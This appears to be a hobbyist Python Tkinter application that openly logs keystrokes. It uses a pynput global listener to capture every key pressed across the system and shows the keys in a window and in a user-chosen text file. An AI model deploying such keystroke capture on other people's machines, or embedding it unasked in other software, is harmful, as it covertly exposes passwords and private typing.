import tkinter as tk
from tkinter import ttk, filedialog
from pynput import keyboard

class KeyLoggerGUI:
    def __init__(self) -> None:
        self.filename = ""
        self.is_logging = False
        self.logged_keys = ""

        self.root = tk.Tk()
        self.root.title("Keylogger by Lakshay Trehan")
        self.root.geometry("500x450")
        self.root.configure(bg="#1e1e1e")

        self.style = ttk.Style()
        self.style.theme_use("clam")
        self.style.configure("TButton", font=("Arial", 12), padding=5, background="#3498db", foreground="white")
        self.style.configure("TLabel", font=("Arial", 12), background="#1e1e1e", foreground="white")

        frame = ttk.Frame(self.root, padding=10)
        frame.pack(fill="both", expand=True)

        self.textbox = tk.Text(frame, wrap="word", font=("Courier", 10), bg="#282c34", fg="white", height=10, insertbackground="white")
        self.textbox.pack(fill="both", expand=True, padx=10, pady=10)

        self.status_label = ttk.Label(frame, text="Logging Stopped", foreground="red")
        self.status_label.pack(pady=5)

        button_frame = ttk.Frame(frame)
        button_frame.pack(pady=10)

        self.start_button = ttk.Button(button_frame, text="Start Logging", command=self.start_logging)
        self.start_button.grid(row=0, column=0, padx=5, pady=5, sticky="ew")

        self.stop_button = ttk.Button(button_frame, text="Stop Logging", command=self.stop_logging, state="disabled")
        self.stop_button.grid(row=0, column=1, padx=5, pady=5, sticky="ew")

        self.clear_button = ttk.Button(button_frame, text="Clear Logs", command=self.clear_logs)
        self.clear_button.grid(row=1, column=0, padx=5, pady=5, sticky="ew")

        self.save_button = ttk.Button(button_frame, text="Choose File", command=self.choose_file)
        self.save_button.grid(row=1, column=1, padx=5, pady=5, sticky="ew")

        for i in range(2):
            button_frame.columnconfigure(i, weight=1)

    @staticmethod
    def get_char(key):
        try:
            return key.char if key.char else str(key)
        except AttributeError:
            return str(key)

    def on_press(self, key):
        char = self.get_char(key)
        self.logged_keys += char
        self.textbox.insert(tk.END, char)
        self.textbox.see(tk.END)
        if self.filename:
            with open(self.filename, 'a') as logs:
                logs.write(char)

    def start_logging(self):
        if not self.is_logging:
            self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                          filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            if self.filename:
                self.is_logging = True
                self.start_button.config(state="disabled")
                self.stop_button.config(state="normal")
                self.status_label.config(text="Logging Started", foreground="green")
                self.listener = keyboard.Listener(on_press=self.on_press)
                self.listener.start()

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
            self.status_label.config(text="Logging Stopped", foreground="red")
            self.listener.stop()

    def clear_logs(self):
        self.logged_keys = ""
        self.textbox.delete(1.0, tk.END)

    def choose_file(self):
        self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                      filetypes=[("Text files", "*.txt"), ("All files", "*.*")])

    def run(self):
        self.root.mainloop()

if __name__ == '__main__':
    logger = KeyLoggerGUI()
    logger.run()
